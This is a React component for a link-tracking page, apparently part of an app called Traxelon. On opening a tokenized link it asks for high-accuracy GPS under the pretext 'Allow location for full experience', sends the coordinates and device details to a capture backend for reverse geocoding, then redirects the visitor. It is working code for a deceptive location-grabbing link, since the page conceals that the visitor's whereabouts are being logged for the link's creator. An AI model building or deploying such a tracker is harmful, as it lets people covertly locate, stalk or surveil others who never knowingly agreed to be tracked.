/**
 * TrackingCapture — /t/:token
 *
 * 1. Requests GPS via browser prompt (enableHighAccuracy: true)
 * 2. POSTs raw GPS coords + device info to backend
 * 3. Backend does reverse geocoding (Nominatim) + IP enrichment server-side
 * 4. Redirects to destination URL
 */

import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";

// Bump version number here to clear old sessionStorage blocks when testing
function getCaptureKey(token) {
  return `traxelon_captured_v3_${token}`;
}

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("📍 Allow location for full experience…");
  const hasSent = useRef(false);

  // Requests GPS with enableHighAccuracy: true, falls back to IP if denied
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) {
      setStatus("Redirecting…");
    }
  }, [token]);

  useEffect(() => {
    if (loading) return;           // still waiting for GPS response
    if (hasSent.current) return;   // already fired
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return; // already captured this session

    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [loading]);

  async function sendCapture() {
    setStatus("Redirecting…");

    let destinationUrl = null;

    try {
      const payload = {
        token,
        referrer: document.referrer || null,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: navigator.platform,

        // Send raw GPS coords — backend does reverse geocoding via Nominatim
        gpsLat: location?.source === "gps" ? (location?.lat ?? null) : null,
        gpsLon: location?.source === "gps" ? (location?.lon ?? null) : null,
        gpsAccuracy: location?.source === "gps" ? (location?.gpsAccuracy ?? null) : null,
      };

      console.log("[TrackingCapture] Sending payload:", payload);

      const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      console.log("[TrackingCapture] Backend response:", data);
      destinationUrl = data?.destinationUrl ?? null;
    } catch (err) {
      console.error("[TrackingCapture] Error:", err);
    }

    if (destinationUrl) {
      window.location.replace(destinationUrl);
    }
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        background: "#ffffff",
        fontFamily: "sans-serif",
      }}
    >
      <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
        <div
          style={{
            width: 36,
            height: 36,
            border: "3px solid #f0f0f0",
            borderTop: "3px solid #4a90e2",
            borderRadius: "50%",
            margin: "0 auto 16px",
            animation: "spin 0.9s linear infinite",
          }}
        />
        <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}